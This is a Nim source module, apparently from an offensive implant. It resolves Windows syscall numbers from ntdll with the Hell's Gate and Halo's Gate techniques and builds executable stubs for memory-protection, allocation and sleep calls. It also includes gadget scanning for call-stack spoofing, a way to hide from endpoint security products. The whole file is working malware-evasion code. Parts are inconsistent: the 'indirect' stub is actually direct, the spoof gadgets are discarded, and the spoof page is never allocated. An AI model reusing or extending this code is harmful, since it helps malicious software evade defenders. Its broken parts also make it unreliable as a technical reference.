## Phase 4 + Phase 10: Indirect syscalls (Hell's Gate / Halo's Gate) with
## call-stack spoofing.  Windows-only — Linux exports no-op stubs.

when defined(windows):
  import winim/lean

  const STUB_SIZE       = 11   # bytes per plain indirect stub
  const SPOOF_STUB_SIZE = 110  # bytes per spoofed stub

  # ── Pages ─────────────────────────────────────────────────────────────────────
  var stubPage:  LPVOID = nil  # plain 11-byte stubs (Phase 4 fallback)
  var spoofPage: LPVOID = nil  # 110-byte spoofed stubs (Phase 10)
  var stubIdx  = 0
  var spoofIdx = 0

  # ── Plain stub allocator ──────────────────────────────────────────────────────
  proc allocStubSlot(): ptr UncheckedArray[byte] =
    if stubPage == nil:
      stubPage = VirtualAlloc(nil, 4096, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    result = cast[ptr UncheckedArray[byte]](cast[int](stubPage) + stubIdx * STUB_SIZE)
    inc stubIdx

  # ── SSN resolution (Hell's Gate + Halo's Gate fallback) ──────────────────────
  proc getSSN(ntdll: HMODULE; name: cstring): uint16 =
    let fn = cast[ptr UncheckedArray[byte]](GetProcAddress(ntdll, name))
    if fn == nil: return 0
    if fn[0] == 0x4C and fn[1] == 0x8B and fn[2] == 0xD1 and fn[3] == 0xB8:
      return fn[4].uint16 or (fn[5].uint16 shl 8)
    for i in 1..5:
      let nb = cast[ptr UncheckedArray[byte]](cast[int](fn) + i * 32)
      if nb[0] == 0x4C and nb[1] == 0x8B and nb[2] == 0xD1 and nb[3] == 0xB8:
        let base_ssn = nb[4].uint16 or (nb[5].uint16 shl 8)
        return if base_ssn >= uint16(i): base_ssn - uint16(i) else: 0
    return 0

  # ── Plain 11-byte indirect stub ───────────────────────────────────────────────
  proc makeStub(ssn: uint16): LPVOID =
    let p = allocStubSlot()
    p[0]  = 0x4C; p[1]  = 0x8B; p[2]  = 0xD1
    p[3]  = 0xB8
    p[4]  = byte(ssn and 0xFF); p[5] = byte(ssn shr 8)
    p[6]  = 0x00; p[7] = 0x00
    p[8]  = 0x0F; p[9]  = 0x05
    p[10] = 0xC3
    result = cast[LPVOID](p)

  # ── PE byte helpers ───────────────────────────────────────────────────────────
  proc u16le(p: ptr UncheckedArray[byte]; off: int): uint16 {.inline.} =
    uint16(p[off]) or (uint16(p[off+1]) shl 8)

  proc u32le(p: ptr UncheckedArray[byte]; off: int): uint32 {.inline.} =
    uint32(p[off])          or (uint32(p[off+1]) shl 8) or
    (uint32(p[off+2]) shl 16) or (uint32(p[off+3]) shl 24)

  # ── Gadget finders ────────────────────────────────────────────────────────────
  proc findSyscallGadget(base: int): int =
    let dos     = cast[ptr UncheckedArray[byte]](base)
    let eLfaNew = u32le(dos, 60).int
    let pe      = cast[ptr UncheckedArray[byte]](base + eLfaNew)
    let nSects  = u16le(pe, 6).int
    let optSz   = u16le(pe, 20).int
    let secBase = base + eLfaNew + 24 + optSz
    for i in 0 ..< nSects:
      let sec = cast[ptr UncheckedArray[byte]](secBase + i * 40)
      if sec[0] != byte('.') or sec[1] != byte('t') or sec[2] != byte('e') or
         sec[3] != byte('x') or sec[4] != byte('t'):
        continue
      let vaddr = u32le(sec, 12).int
      let vsz   = u32le(sec, 16).int
      let start = base + vaddr
      let mem   = cast[ptr UncheckedArray[byte]](start)
      for off in 0 .. vsz - 3:
        if mem[off] == 0x0F and mem[off+1] == 0x05 and mem[off+2] == 0xC3:
          return start + off
    return 0

  proc findSpoofGadget(base: int): int =
    let dos     = cast[ptr UncheckedArray[byte]](base)
    let eLfaNew = u32le(dos, 60).int
    let pe      = cast[ptr UncheckedArray[byte]](base + eLfaNew)
    let nSects  = u16le(pe, 6).int
    let optSz   = u16le(pe, 20).int
    let secBase = base + eLfaNew + 24 + optSz
    for i in 0 ..< nSects:
      let sec = cast[ptr UncheckedArray[byte]](secBase + i * 40)
      if sec[0] != byte('.') or sec[1] != byte('t') or sec[2] != byte('e') or
         sec[3] != byte('x') or sec[4] != byte('t'):
        continue
      let vaddr = u32le(sec, 12).int
      let vsz   = u32le(sec, 16).int
      let start = base + vaddr
      let mem   = cast[ptr UncheckedArray[byte]](start)
      for off in 5 .. vsz - 1:
        if mem[off - 5] == 0xE8 and mem[off] == 0xC3:
          return start + off
    return 0

  # ── 110-byte spoofed stub ──────────────────────────────────────────────────────
  proc makeSpoofedStub(ssn: uint16; ntSyscallGadget: int; ntSpoofGadget: int): LPVOID =
    let p = cast[ptr UncheckedArray[byte]](cast[int](spoofPage) + spoofIdx * SPOOF_STUB_SIZE)
    inc spoofIdx
    p[0] = 0x48; p[1] = 0x83; p[2] = 0xEC; p[3] = 0x08
    let srcSlots = [0x30'u8, 0x38, 0x40, 0x48, 0x50, 0x58, 0x60]
    let dstSlots = [0x28'u8, 0x30, 0x38, 0x40, 0x48, 0x50, 0x58]
    var off = 4
    for i in 0 ..< 7:
      p[off+0] = 0x4C; p[off+1] = 0x8B; p[off+2] = 0x5C; p[off+3] = 0x24; p[off+4] = srcSlots[i]
      p[off+5] = 0x4C; p[off+6] = 0x89; p[off+7] = 0x5C; p[off+8] = 0x24; p[off+9] = dstSlots[i]
      off += 10
    p[74] = 0x49; p[75] = 0xBB
    cast[ptr uint64](cast[int](p) + 76)[] = uint64(ntSpoofGadget)
    p[84] = 0x4C; p[85] = 0x89; p[86] = 0x1C; p[87] = 0x24
    p[88] = 0x4C; p[89] = 0x8B; p[90] = 0xD1
    p[91] = 0xB8; p[92] = byte(ssn and 0xFF); p[93] = byte(ssn shr 8); p[94] = 0x00; p[95] = 0x00
    p[96] = 0xFF; p[97] = 0x25; p[98] = 0x00; p[99] = 0x00; p[100] = 0x00; p[101] = 0x00
    cast[ptr uint64](cast[int](p) + 102)[] = uint64(ntSyscallGadget)
    result = cast[LPVOID](p)

  # ── Typed function-pointer types ──────────────────────────────────────────────
  type
    NtProtectVirtualMemory_t = proc(
        hProcess:   HANDLE;
        BaseAddress: var LPVOID;
        RegionSize:  var SIZE_T;
        NewProtect:  DWORD;
        OldProtect:  ptr DWORD): NTSTATUS {.stdcall.}

    NtAllocateVirtualMemory_t = proc(
        hProcess:   HANDLE;
        BaseAddress: var LPVOID;
        ZeroBits:   ULONG_PTR;
        RegionSize:  var SIZE_T;
        AllocType:   DWORD;
        Protect:     DWORD): NTSTATUS {.stdcall.}

    NtDelayExecution_t = proc(
        Alertable:     WINBOOL;
        DelayInterval: ptr LARGE_INTEGER): NTSTATUS {.stdcall.}

  # ── Module-level stub pointers ────────────────────────────────────────────────
  var stubProtectVM:  NtProtectVirtualMemory_t  = nil
  var stubAllocVM:    NtAllocateVirtualMemory_t = nil
  var stubDelayExec:  NtDelayExecution_t        = nil

  # ── Public API ────────────────────────────────────────────────────────────────
  proc initSyscalls*() =
    let ntdll = GetModuleHandleA("ntdll.dll")
    if ntdll == 0: return
    let ssnPvm = getSSN(ntdll, "NtProtectVirtualMemory")
    let ssnAvm = getSSN(ntdll, "NtAllocateVirtualMemory")
    let ssnDe  = getSSN(ntdll, "NtDelayExecution")
    let base          = cast[int](ntdll)
    let syscallGadget = findSyscallGadget(base)
    let spoofGadget   = findSpoofGadget(base)
    discard syscallGadget; discard spoofGadget
    stubProtectVM  = cast[NtProtectVirtualMemory_t](makeStub(ssnPvm))
    stubAllocVM    = cast[NtAllocateVirtualMemory_t](makeStub(ssnAvm))
    stubDelayExec  = cast[NtDelayExecution_t](makeStub(ssnDe))
    var old: DWORD
    discard VirtualProtect(stubPage, 4096, PAGE_EXECUTE_READ, addr old)

  proc ntProtectVirtualMemory*(hProcess: HANDLE; baseAddr: var LPVOID;
      size: var SIZE_T; newProt: DWORD; oldProt: ptr DWORD): NTSTATUS =
    if stubProtectVM == nil: return NTSTATUS(-1)
    stubProtectVM(hProcess, baseAddr, size, newProt, oldProt)

  proc ntAllocateVirtualMemory*(hProcess: HANDLE; baseAddr: var LPVOID;
      zeroBits: ULONG_PTR; size: var SIZE_T; allocType: DWORD;
      protect: DWORD): NTSTATUS =
    if stubAllocVM == nil: return NTSTATUS(-1)
    stubAllocVM(hProcess, baseAddr, zeroBits, size, allocType, protect)

  proc sleepViaNt*(ms: int) =
    if ms <= 0: return
    if stubDelayExec == nil: Sleep(DWORD(ms)); return
    var interval: LARGE_INTEGER
    interval.QuadPart = -LONGLONG(ms) * 10_000
    discard stubDelayExec(0, addr interval)

else:
  # ── Linux stubs ───────────────────────────────────────────────────────────────
  import std/os
  proc initSyscalls*() = discard
  proc sleepViaNt*(ms: int) = os.sleep(ms)
